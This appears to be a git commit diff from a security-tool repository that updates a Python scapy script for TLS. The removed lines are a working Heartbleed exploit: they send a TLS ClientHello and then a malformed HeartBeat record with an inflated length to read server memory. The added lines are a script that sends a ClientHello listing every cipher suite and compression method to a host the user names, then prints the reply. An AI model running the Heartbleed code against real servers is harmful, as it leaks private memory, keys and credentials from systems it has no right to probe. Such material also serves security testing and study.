8cb38046ae37139cab906efbe1f33b24b98b9cc1
nu11secur1ty <venvaropt@gmail.com>
2019-11-28 11:45:48 +0200

    Update bahtavdreata.py

--- Maachujdo/headersSSL/bahtavdreata.py
+++ Maachujdo/headersSSL/bahtavdreata.py
@@ -1,17 +1,43 @@
-import scapy
-from scapy.layers.ssl_tls import *
+#!/usr/bin/env python
+# -*- coding: UTF-8 -*-
+# Author : tintinweb@oststrom.com <github.com/tintinweb>
+ 
+from __future__ import print_function
+import sys
+try:
+    import scapy.all as scapy
+except ImportError:
+    import scapy
+ 
+try:
+    # This import works from the project directory
+    from scapy_ssl_tls.ssl_tls import *
+except ImportError:
+    # If you installed this package via pip, you just need to execute this
+    from scapy.layers.ssl_tls import *
+ 
 import socket
-
-target = ('target.local',443)
-
-# create tcp socket
-s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(target)
-p = TLSRecord(version="TLS_1_1")/TLSHandshake()/TLSClientHello(version="TLS_1_1")
-s.sendall(str(p))
-s.recv(8192)
-p = TLSRecord(version="TLS_1_1")/TLSHeartBeat(length=2**14-1,data='bleed...')
-s.sendall(str(p))
-resp = s.recv(8192)
-print "resp: %s"%repr(resp)
-s.close()
+ 
+if __name__ == "__main__":
+    if len(sys.argv) <= 2:
+        print ("USAGE: <host> <port>")
+        exit(1)
+ 
+    target = (sys.argv[1], int(sys.argv[2]))
+ 
+    # create tcp socket
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(target)
+ 
+    # create TLS Handhsake / Client Hello packet
+    p = TLSRecord() / TLSHandshake() / TLSClientHello(compression_methods=range(0xff)[::-1], cipher_suites=range(0xff))
+ 
+    p.show()
+ 
+    print ("sending TLS payload")
+    s.sendall(str(p))
+    resp = s.recv(1024 * 8)
+    print ("received, %s" % repr(resp))
+    SSL(resp).show()
+ 
+    s.close()
